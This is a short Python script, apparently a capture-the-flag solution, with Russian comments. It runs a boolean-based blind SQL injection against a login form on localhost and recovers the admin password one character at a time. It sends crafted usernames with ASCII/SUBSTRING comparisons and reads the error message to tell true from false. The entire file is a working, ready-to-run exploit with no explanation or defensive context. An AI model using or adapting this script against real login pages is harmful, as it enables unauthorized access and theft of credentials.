import requests
import time

url = "http://localhost:8080/index.php"

def check_char(position, ascii_code):
    """Проверяет символ на позиции"""
    payload = f"admin\\\\\\' OR ASCII(SUBSTRING(password,{position},1))={ascii_code} #"
    data = {
        'username': payload,
        'password': 'x'
    }
    response = requests.post(url, data=data)
    
    return "Неверный пароль" in response.text

common_chars = "{0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_}"

password = ""
position = 1

while True:
    found = False
    for char in common_chars:
        ascii_code = ord(char)
        if check_char(position, ascii_code):
            password += char
            print(f"Позиция {position}: {char} -> {password}")
            found = True
            
            if char == '}':
                print(f"\nПароль: {password}")
                exit()
            break
    
    if not found:
        print(f"[-] Не найден символ на позиции {position}")
        for ascii_code in range(32, 127):
            if check_char(position, ascii_code):
                password += chr(ascii_code)
                print(f"[+] Позиция {position}: {chr(ascii_code)} -> {password}")
                found = True
                break
        
        if not found:
            print(f"[-] Достигнут конец строки на позиции {position}")
            break
    
    position += 1
    time.sleep(0.1)

print(f"\n[!] Итоговый пароль: {password}")
